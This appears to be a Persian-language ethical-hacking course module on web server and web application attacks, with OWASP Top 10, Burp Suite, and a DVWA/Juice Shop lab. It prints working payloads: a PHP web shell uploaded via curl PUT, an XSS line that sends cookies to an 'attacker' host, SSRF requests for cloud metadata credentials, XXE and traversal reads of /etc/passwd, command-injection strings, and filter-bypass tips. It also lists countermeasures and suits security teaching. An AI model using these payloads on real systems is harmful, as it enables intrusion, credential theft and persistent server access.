# هک وب‌سرور و وب‌اپلیکیشن

**مدت یادگیری**: ۶ ساعت
**سطح سختی**: پیشرفته
**پیش‌نیاز**: فایل ۰۲ (شبکه) و ۰۷ (تحلیل آسیب‌پذیری)

---

## فهرست محتوا

- [فصل ۱: معماری وب](#فصل-۱-معماری-وب)
- [فصل ۲: حملات وب‌سرور](#فصل-۲-حملات-وبسرور)
- [فصل ۳: OWASP Top 10](#فصل-۳-owasp-top-10)
- [فصل ۴: کارگاه Burp Suite](#فصل-۴-کارگاه-burp-suite)
- [فصل ۵: حملات رایج وب](#فصل-۵-حملات-رایج-وب)
- [فصل ۶: آزمایشگاه و اقدامات متقابل](#فصل-۶-آزمایشگاه-و-اقدامات-متقابل)

---

## فصل ۱: معماری وب

### مقدمه

وب بزرگ‌ترین سطح حمله امروز است. برای هک آن، باید بدانیم یک اپلیکیشن وب **چطور ساخته و اجرا می‌شود**.

### مفاهیم اساسی

**اجزای یک اپلیکیشن وب:**
```
مرورگر (Client)
    │ HTTP/HTTPS
    ▼
وب‌سرور (Nginx/Apache/IIS)
    │
    ▼
اپلیکیشن (PHP/Python/Node/Java)
    │
    ▼
دیتابیس (MySQL/PostgreSQL/MongoDB)
```

**مفاهیم کلیدی:**
- **Frontend:** HTML/CSS/JS (سمت مرورگر).
- **Backend:** منطق سرور.
- **API:** رابط ارتباط (REST/GraphQL).
- **Session/Cookie:** مدیریت حالت.
- **CMS:** سیستم مدیریت محتوا (WordPress، Joomla).

### نکات مهم (Tips & Tricks)

- **سطح حمله = ورودی‌های کاربر:** URL، فرم، هدر، کوکی، فایل آپلود.
- شناخت تکنولوژی (Fingerprinting) اولین قدم است: `whatweb`، `wappalyzer`.
- **WordPress** پرکاربردترین CMS و هدف محبوب است.

### خلاصه فصل

- معماری: Client → Server → App → DB.
- ورودی کاربر = سطح حمله.
- شناخت تکنولوژی پیش‌نیاز حمله است.

---

## فصل ۲: حملات وب‌سرور

### مقدمه

خود وب‌سرور (Nginx/Apache/IIS) نیز آسیب‌پذیری‌های خاص خود را دارد.

### مفاهیم اساسی

**حملات رایج وب‌سرور:**
- **Misconfiguration:** پیکربندی اشتباه (Directory Listing، فایل‌های حساس).
- **Default Credentials:** رمز پیش‌فرض.
- **Directory Traversal:** خروج از دایرکتوری (`../../etc/passwd`).
- **HTTP Verb Tampering:** سوءاستفاده از متدهای HTTP.
- **Unpatched Software:** نسخه آسیب‌پذیر.
- **Web Cache Poisoning.**
- **HTTP Request Smuggling.**

**فایل‌های حساس:** `.git/`, `.env`, `backup.zip`, `phpinfo.php`, `web.config`.

### مثال عملی

```bash
# === Fingerprinting ===
whatweb http://192.168.56.101
nikto -h http://192.168.56.101

# === بررسی فایل‌های حساس ===
curl http://192.168.56.101/.git/config
curl http://192.168.56.101/.env
curl http://192.168.56.101/backup.zip

# === Directory Traversal ===
curl "http://192.168.56.101/download?file=../../../../etc/passwd"

# === Directory Brute-force ===
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://192.168.56.101

# === HTTP Verbs ===
curl -X OPTIONS http://192.168.56.101 -i
curl -X PUT http://192.168.56.101/shell.php --data "<?php system($_GET['c']); ?>"
```

### اشکال شایع

- **مشکل:** Gobuster نتیجه نمی‌دهد → wordlist بهتری انتخاب کنید یا پسوند اضافه کنید (`-x php,txt`).
- **مشکل:** Traversal فیلتر شده → از انکودینگ (`%2e%2e%2f`) استفاده کنید.

### نکات مهم (Tips & Tricks)

- **`.git` لو رفته** = کد کامل اپلیکیشن.
- **gobuster/feroxbuster** ابزار اصلی کشف مسیر.
- **HTTP Verb Tampering** اغلب نادیده گرفته می‌شود.

### خلاصه فصل

- حملات: Misconfig، Default Cred، Traversal، Verb Tampering.
- کشف مسیر با gobuster/feroxbuster.
- فایل‌های حساس (.git، .env) اهداف طلایی.

---

## فصل ۳: OWASP Top 10

### مقدمه

**OWASP Top 10** فهرست مهم‌ترین آسیب‌پذیری‌های وب است و پایه هر تست نفوذ وب.

### مفاهیم اساسی

| # | آسیب‌پذیری | توضیح کوتاه |
|---|------------|-------------|
| A01 | Broken Access Control | دسترسی غیرمجاز به منابع |
| A02 | Cryptographic Failures | رمزنگاری ضعیف |
| A03 | Injection | تزریق (SQLi، Command) |
| A04 | Insecure Design | طراحی ناامن |
| A05 | Security Misconfiguration | پیکربندی اشتباه |
| A06 | Vulnerable Components | اجزای آسیب‌پذیر |
| A07 | Auth Failures | احراز هویت ضعیف |
| A08 | Integrity Failures | نقض یکپارچگی |
| A09 | Logging Failures | لاگ‌گیری ضعیف |
| A10 | SSRF | درخواست جعلی سمت سرور |

### مثال عملی

```text
# === A01: Broken Access Control ===
# تغییر مستقیم ID در URL:
http://target/profile?id=1  →  http://target/profile?id=2
# (IDOR - Insecure Direct Object Reference)

# === A07: Auth Failures ===
# عدم محدودیت تلاش ورود → Brute-force با Hydra

# === A10: SSRF ===
# وادار کردن سرور به درخواست به منابع داخلی:
http://target/fetch?url=http://169.254.169.254/latest/meta-data/
# (دسترسی به متادیتای ابری!)
```

### اشکال شایع

- **مشکل:** حفظ کردن A01-A10 → اصول را بفهمید، نه ترتیب را.
- **مشکل:** تمرکز فقط روی Injection → Access Control بزرگ‌ترین خطر است.

### نکات مهم (Tips & Tricks)

- **A01 Broken Access Control** امروز شماره یک است.
- **IDOR** یکی از رایج‌ترین و پرسودترین باگ‌هاست.
- **SSRF** می‌تواند به متادیتای ابری دسترسی بدهد (خطر بزرگ).

### خلاصه فصل

- OWASP Top 10 پایه تست وب.
- A01 (Access Control) و A03 (Injection) بحرانی‌اند.
- IDOR و SSRF بسیار پرسود.

---

## فصل ۴: کارگاه Burp Suite

### مقدمه

**Burp Suite** ابزار شماره یک تست نفوذ وب است. نسخه Community رایگان است.

### مفاهیم اساسی

**اجزای Burp:**
- **Proxy:** رهگیری و تغییر درخواست‌ها.
- **Repeater:** ارسال مجدد و دستکاری درخواست.
- **Intruder:** حمله خودکار (Fuzzing، Brute-force).
- **Scanner:** اسکن خودکار (نسخه Pro).
- **Decoder:** انکود/دیکود.
- **Comparer:** مقایسه پاسخ‌ها.
- **Sequencer:** تحلیل تصادفی بودن.

**راه‌اندازی:**
1. Burp را اجرا کنید.
2. مرورگر را روی پروکسی `127.0.0.1:8080` تنظیم کنید.
3. گواهی CA Burp را نصب کنید (برای HTTPS).

### مثال عملی

```text
# === Proxy ===
# Intercept را روشن کنید، درخواست را بگیرید و تغییر دهید

# === Repeater ===
# درخواست را به Repeater بفرستید (Ctrl+R) و تغییرات را تست کنید

# === Intruder ===
# 1) درخواست را به Intruder بفرستید
# 2) موقعیت حمله را با § مشخص کنید
# 3) Payload را تنظیم کنید (Sniper، Cluster Bomb)
# 4) حمله را شروع کنید

# === Decoder ===
# تبدیل Base64، URL Encode، Hex
```

### اشکال شایع

- **مشکل:** HTTPS کار نمی‌کند → گواهی CA را نصب کنید (`http://burp`).
- **مشکل:** Intruder کند است → نسخه Community محدودیت سرعت دارد (Pro سریع‌تر).
- **مشکل:** سایت من را بلاک می‌کند → تأخیر بین درخواست‌ها اضافه کنید.

### نکات مهم (Tips & Tricks)

- **Repeater** پرکاربردترین بخش Burp است.
- **Intruder** برای Fuzzing پارامترها و Brute-force.
- افزونه‌ها (BApp Store): Logger++، Autorize، Turbo Intruder.
- **Burp** + **FoxyProxy** در فایرفاکس = ترکیب عالی.

### خلاصه فصل

- Burp Suite ابزار اصلی تست وب.
- Proxy → Repeater → Intruder چرخه اصلی.
- گواهی CA برای HTTPS ضروری است.

---

## فصل ۵: حملات رایج وب

### مقدمه

در این فصل مهم‌ترین حملات وب را با مثال می‌بینیم (SQL Injection در فایل ۱۶ جداگانه).

### مفاهیم اساسی

**XSS (Cross-Site Scripting):**
- **Reflected:** در پاسخ فوری بازتاب می‌یابد.
- **Stored:** در دیتابیس ذخیره می‌شود.
- **DOM-based:** در سمت مرورگر.

**CSRF (Cross-Site Request Forgery):** وادار کردن کاربر به انجام عمل ناخواسته.

**SSRF:** وادار کردن سرور به درخواست به مقصد دلخواه.

**XXE:** تزریق موجودیت خارجی در XML.

**File Upload:** آپلود فایل مخرب (Web Shell).

**Command Injection:** اجرای دستور سیستمی.

### مثال عملی

```bash
# === XSS (Reflected) ===
<script>alert(1)</script>
<script>fetch('http://attacker/steal?c='+document.cookie)</script>

# === CSRF ===
# صفحه‌ای که درخواست را خودکار ارسال می‌کند:
# <img src="http://bank.com/transfer?to=attacker&amount=1000">

# === SSRF ===
# url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# === XXE ===
# <?xml version="1.0"?>
# <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <root>&xxe;</root>

# === Command Injection ===
# ; ls -la
# | whoami
# $(cat /etc/passwd)
# `id`

# === File Upload → Web Shell ===
# shell.php: <?php system($_GET['cmd']); ?>
# سپس: http://target/uploads/shell.php?cmd=id
```

### اشکال شایع

- **مشکل:** XSS فیلتر شده → از Bypass (رویدادها، انکودینگ) استفاده کنید.
- **مشکل:** File Upload محدود است → Content-Type و پسوند را دستکاری کنید.
- **مشکل:** Command Injection فیلتر دارد → جداکننده‌های جایگزین امتحان کنید.

### نکات مهم (Tips & Tricks)

- **Web Shell** = دسترسی پایدار به سرور وب.
- **XSS** برای دزدیدن کوکی و **CSRF** برای انجام عمل.
- **SSRF** می‌تواند به شبکه داخلی نفوذ کند.
- همیشه ورودی را **پالایش (Sanitize)** کنید (سمت مدافع).

### خلاصه فصل

- XSS (Reflected/Stored/DOM)، CSRF، SSRF، XXE، Command Injection، File Upload.
- هر حمله تکنیک و دفاع خاص دارد.
- Web Shell نتیجه نهایی نفوذ وب است.

---

## فصل ۶: آزمایشگاه و اقدامات متقابل

### مقدمه

بیایید یک تست کامل روی DVWA و Juice Shop انجام دهیم.

### مثال عملی — آزمایشگاه

```bash
# === آماده‌سازی ===
# DVWA روی http://192.168.56.101/dvwa
# Juice Shop روی http://192.168.56.102:3000

# === ۱. Fingerprinting ===
whatweb http://192.168.56.101
nikto -h http://192.168.56.101

# === ۲. کشف مسیر ===
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,txt

# === ۳. تست با Burp ===
# Proxy → Repeater → تست دستی پارامترها

# === ۴. XSS در DVWA ===
# Reflected: <script>alert(document.cookie)</script>

# === ۵. File Upload در DVWA ===
# آپلود shell.php و اجرای دستور

# === ۶. Juice Shop ===
# چالش‌های داخلی را حل کنید (مناسب تمرین OWASP Top 10)

# === ۷. مستندسازی ===
mkdir -p web/$TARGET
# ذخیره درخواست‌ها، پاسخ‌ها و PoC
```

### اشکال شایع

- **مشکل:** Burp ترافیک را نمی‌بیند → تنظیم پروکسی مرورگر.
- **مشکل:** Juice Shop اجرا نمی‌شود → `docker run -d -p 3000:3000 bkimminich/juice-shop`.

### نکات مهم (Tips & Tricks)

- DVWA سه سطح (Low/Medium/High) برای تمرین تدریجی دارد.
- Juice Shop چالش‌محور و مدرن است.
- PoC (اثبات مفهوم) برای هر یافته تهیه کنید.

### اقدامات متقابل (Countermeasures)

| آسیب‌پذیری | راهکار |
|------------|--------|
| XSS | Output Encoding، CSP، ورودی‌پالایی |
| CSRF | CSRF Token، SameSite Cookie |
| SSRF | Whitelist مقاصد، غیرفعال‌سازی متادیتا |
| XXE | غیرفعال‌سازی External Entities |
| Command Injection | عدم استفاده از ورودی در دستور، Escaping |
| File Upload | Whitelist پسوند، بازرسی محتوا، ذخیره خارج از Webroot |
| Misconfig | Hardening، حذف فایل‌های حساس |

### خلاصه فصل

- آزمایشگاه: Fingerprint → کشف مسیر → Burp → XSS → Upload.
- DVWA و Juice Shop محیط‌های تمرینی عالی.
- دفاع: پالایش ورودی، Encoding خروجی، Token.

---

## منابع و مراجع

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **OWASP Web Security Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Web Security Academy:** https://portswigger.net/web-security
- **Burp Suite:** https://portswigger.net/burp
- **DVWA:** https://github.com/digininja/DVWA
- **OWASP Juice Shop:** https://owasp.org/www-project-juice-shop/
- **gobuster:** https://github.com/OJ/gobuster
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
